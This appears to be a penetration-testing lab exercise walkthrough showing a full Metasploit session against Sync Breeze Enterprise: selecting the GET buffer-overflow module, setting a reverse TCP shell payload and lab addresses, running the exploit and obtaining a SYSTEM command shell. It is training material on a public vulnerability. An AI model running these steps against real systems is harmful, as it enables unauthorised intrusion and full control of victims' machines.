22.2.1.1

# 22.2.1.1.1. Exploit SyncBreeze using the Metasploit module.

```plaintext
msf5 > search syncbreeze

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  exploit/windows/fileformat/syncbreeze_xml  2017-03-29       normal  No     Sync Breeze Enterprise 9.5.16 - Import Command Buffer Overflow
   1  exploit/windows/http/syncbreeze_bof        2017-03-15       great   Yes    Sync Breeze Enterprise GET Buffer Overflow


msf5 > use 1
msf5 exploit(windows/http/syncbreeze_bof) > info

       Name: Sync Breeze Enterprise GET Buffer Overflow
     Module: exploit/windows/http/syncbreeze_bof
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2017-03-15

Provided by:
  Daniel Teixeira
  Andrew Smith
  Owais Mehtab
  Milton Valencia (wetw0rk)

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Sync Breeze Enterprise v9.4.28
  2   Sync Breeze Enterprise v10.0.28
  3   Sync Breeze Enterprise v10.1.16

msf5 exploit(windows/http/syncbreeze_bof) > show payloads

Compatible Payloads
===================

   #    Name                                                Disclosure Date  Rank    Check  Description
   -    ----                                                ---------------  ----    -----  -----------
   0    generic/custom                                                       manual  No     Custom Payload
   1    generic/debug_trap                                                   manual  No     Generic x86 Debug Trap
...
   107  windows/shell/reverse_tcp                                            manual  No     Windows Command Shell, Reverse TCP Stager
   108  windows/shell/reverse_tcp_allports                                   manual  No     Windows Command Shell, Reverse All-Port TCP Stager
   109  windows/shell/reverse_tcp_dns                                        manual  No     Windows Command Shell, Reverse TCP Stager (DNS)
...
msf5 exploit(windows/http/syncbreeze_bof) > set payload 107
payload => windows/shell/reverse_tcp

msf5 exploit(windows/http/syncbreeze_bof) > set rhosts 192.168.214.10
rhosts => 192.168.214.10
msf5 exploit(windows/http/syncbreeze_bof) > set lhost 192.168.119.214
lhost => 192.168.119.214
msf5 exploit(windows/http/syncbreeze_bof) > show options

Module options (exploit/windows/http/syncbreeze_bof):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.214.10   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.119.214  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/syncbreeze_bof) > check
[*] 192.168.214.10:80 - The target appears to be vulnerable.
msf5 exploit(windows/http/syncbreeze_bof) > exploit

[*] Started reverse TCP handler on 192.168.119.214:4444 
[*] Automatically detecting target...
[*] Target is 10.0.28
[*] Sending request...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.214.10
[*] Command shell session 1 opened (192.168.119.214:4444 -> 192.168.214.10:63839) at 2020-10-10 17:56:12 -0400

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.214.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.214.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.214.254

C:\Windows\system32>
```